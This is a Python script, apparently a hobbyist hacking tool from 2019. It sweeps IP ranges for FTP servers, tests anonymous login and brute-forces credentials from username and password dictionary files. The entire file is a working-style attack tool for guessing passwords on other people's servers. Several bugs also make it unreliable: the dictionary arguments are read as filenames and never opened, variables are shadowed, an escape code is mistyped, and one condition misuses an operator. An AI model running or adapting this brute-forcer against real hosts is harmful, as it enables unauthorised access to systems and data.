import ftplib
import argparse
import time

ips = [] #存储要扫描的目标IP
port = None #默认端口设置为21
Usernames = [] #存储爆破的用户名
Passwords = [] #存储爆破的密码
ip_net = None #默认存储IP地址所属网段
logo = '\033[1;36m'+'''
                       FFFFFFFFFFFFFFFFFFF     TTTTTTTTTTTTTTTTTTTTTT              PPPPPPPPPPP
                      FFFFFFFFFFFFFFFFFF       TTTTTTTTTTTTTTTTTTTTTT           PPPPP       PPPPP
                     FFFFF                            TTTTTT                  PPPPP           PPPPP
                    FFFFF                             TTTTTT                PPPPP      PPP      PPPPP
                   FFFFF                              TTTTTT                PPPP    PPP   PPP    PPPPP  
                  FFFFFFFFFFFFFFFFFFF                 TTTTTT                PPPPP      PPP     PPPPP
                 FFFFFFFFFFFFFFFFF                    TTTTTT                PPPP PP         PPPPP 
                FFFFF                                 TTTTTT                PPPP   PPPPPPPPPPP                 
               FFFFF                                  TTTTTT                PPPP
              FFFFF                                   TTTTTT                PPPP
             FFFFF                                    TTTTTT                PPPP
            FFFFF                                     TTTTTT                PPPP                                   
                                                                                    By Sccc--KaliYang
                                                                                        version 1.0 
                                                                                        2019/12/17
                                                                                                '''
def init():
    print(logo)
def CheckIP(host_ip):
    try:
        ip_net = str(host_ip).split('.')[0] +'.'+ str(host_ip).split('.')[1] +'.'+ str(host_ip).split('.')[2]  
        return True  
    except:
        ip_net = None
        return False
def anonyScan(host): 
    try:
        ftplib.FTP_PORT = port
        with ftplib.FTP(host) as ftp:
            ftp.login()
            print ('\033[1;31m\n[*] ' + str(host) + "FTP Anonymous login successful!")
            return True
    except:
        print ('\033[1;32m\n[-] ' + str(host) + "FTP Anonymous login failure!")
        return False
def ftp_login(ip,port=21):
    for username in Usernames:
        user =username.rstrip()
        for password in Passwords:   
            pwd = password.rstrip()
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip,port,10)
                ftp.login(user,pwd)
                ftp.quit()
                print ('\033[1;31m[+] FTP weak password: '+user,pwd)
            except:
                print ('\032[1;34m[-] checking for '+user,pwd+' fail')
def main():
    parser = argparse.ArgumentParser(description='FTP Scanner')
    parser.add_argument('-I',dest='ip',help='\033[1;33m The target ip list with "," or "-" or "/24" space')
    parser.add_argument('-P',dest='Port',help='\033[1;33m The target ip with port ')
    parser.add_argument('-fu',dest='UserlistFile',help='\033[1;33m Username dictionadry file')
    parser.add_argument('-fp',dest='pwdlistFile',help='\033[1;33m Password dictionadry file')
    args = None 
    try:
        args = parser.parse_args()
        if args.ip == None:
            exit(0)
    except:
        print(parser.parse_args(['-h']))
        exit(0)    
    if ',' in str(args.ip):
        if(CheckIP(str(args.ip))):
            ips = str(args.ip).split(',')
        else:
            print('this target ip format is False')
            exit(0)
    elif '-' in str(args.ip):        
        if(CheckIP(str(args.ip))):
            ip_net = str(args.ip).split('-')[0].split('.')[0] + '.' + str(args.ip).split('-')[0].split('.')[1]+ '.' + str(args.ip).split('-')[0].split('.')[2] 
            start_ip = str(args.ip).split('-')[0].split('.')[3]
            end_ip = str(args.ip).split('-')[1].split('.')[3]
            for ip in range(int(start_ip),int(end_ip)+1):  
                ip = ip_net + '.' + str(ip)             
                ips.append(ip)
        else:
            print('this target ip format is False')
            exit(0)
    elif '/24' in str(args.ip):
        if(CheckIP(str(args.ip))):
            ip_net = str(args.ip).split('.')[0] + '.' + str(args.ip).split('.')[1]+ '.' + str(args.ip).split('.')[2]    
            for ip in range(1,255):  
                ip = ip_net + '.' + str(ip)             
                ips.append(ip)
        else:
            print('this target ip format is False')
            exit(0)
    else:
        if(CheckIP(str(args.ip))):
            ips.append(str(args.ip))
        else:
            print('this target ip format is False')
            exit(0)
    Usernames = args.UserlistFile
    Passwords = args.pwdlistFile
    if ips == ['None']:
        print('\033[1;36m'+parser.parse_args(['-h']))
        exit(0)
    else:
        for ip in ips:
            time.sleep(0.3)
            if anonyScan(ip) == True:
                print ('Host: ' + ip + 'Can anonymously!')
            elif Passwords != None & Usernames!= None:
                try:
                    port = args.Port
                except:
                    port = 21
                ftp_login(ip,port)
            else:
                print('\033[1;36m'+parser.parse_args(['-h']))
                exit(0)
        print ('\n[*]------------------------Scan End!------------------------[*]')

if __name__=='__main__':
    init()
    main()